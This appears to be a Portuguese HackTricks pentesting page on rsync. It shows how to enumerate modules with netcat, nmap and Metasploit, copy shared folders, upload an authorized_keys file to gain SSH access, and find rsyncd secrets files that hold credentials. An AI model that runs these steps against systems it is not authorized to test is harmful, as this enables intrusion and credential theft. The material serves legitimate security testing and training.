# 873 - Pentesting Rsync

{{#include ../banners/hacktricks-training.md}}

## **Informações Básicas**

De [wikipedia](https://en.wikipedia.org/wiki/Rsync):

> **rsync** é uma utilidade para transferir e sincronizar [arquivos](https://en.wikipedia.org/wiki/Computer_file) de forma eficiente entre um computador e um disco rígido externo e entre [computadores](https://en.wikipedia.org/wiki/Computer) em uma [rede](https://en.wikipedia.org/wiki/Computer_network), comparando os [tempos de modificação](<https://en.wikipedia.org/wiki/Timestamping_(computing)>) e tamanhos dos arquivos.[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite_note-man_page-3) É comumente encontrado em sistemas [operacionais](https://en.wikipedia.org/wiki/Operating_system) [Unix-like](https://en.wikipedia.org/wiki/Unix-like). O algoritmo rsync é um tipo de [codificação delta](https://en.wikipedia.org/wiki/Delta_encoding) e é usado para minimizar o uso da rede. [Zlib](https://en.wikipedia.org/wiki/Zlib) pode ser usado para compressão adicional de [dados](https://en.wikipedia.org/wiki/Data_compression),[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite_note-man_page-3) e [SSH](https://en.wikipedia.org/wiki/Secure_Shell) ou [stunnel](https://en.wikipedia.org/wiki/Stunnel) podem ser usados para segurança.

**Porta padrão:** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## Enumeração

### Banner e comunicação manual
```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **Enumerando Pastas Compartilhadas**

**Módulos Rsync** são reconhecidos como **compartilhamentos de diretório** que podem ser **protegidos por senhas**. Para identificar módulos disponíveis e verificar se eles requerem senhas, os seguintes comandos são usados:
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

# Example with IPv6 and alternate port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
Esteja ciente de que algumas compartilhamentos podem não aparecer na lista, possivelmente ocultando-os. Além disso, o acesso a alguns compartilhamentos pode ser restrito a **credenciais** específicas, indicado por uma mensagem de **"Acesso Negado"**.

### [**Força Bruta**](../generic-hacking/brute-force.md#rsync)

### Uso Manual do Rsync

Após obter uma **lista de módulos**, as ações dependem de se a autenticação é necessária. Sem autenticação, **listar** e **copiar** arquivos de uma pasta compartilhada para um diretório local é realizado através de:
```bash
# Listing a shared folder
rsync -av --list-only rsync://192.168.0.123/shared_name

# Copying files from a shared folder
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
Este processo **transfere arquivos recursivamente**, preservando seus atributos e permissões.

Com **credenciais**, listar e baixar de uma pasta compartilhada pode ser feito da seguinte forma, onde um prompt de senha aparecerá:
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
Para **carregar conteúdo**, como um arquivo _**authorized_keys**_ para acesso, use:
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

Para localizar o arquivo de configuração do rsyncd, execute:
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
Dentro deste arquivo, um parâmetro de _secrets file_ pode apontar para um arquivo contendo **nomes de usuário e senhas** para autenticação do rsyncd.

## Referências

- [https://www.smeegesec.com/2016/12/pentesting-rsync.html](https://www.smeegesec.com/2016/12/pentesting-rsync.html)

{{#include ../banners/hacktricks-training.md}}
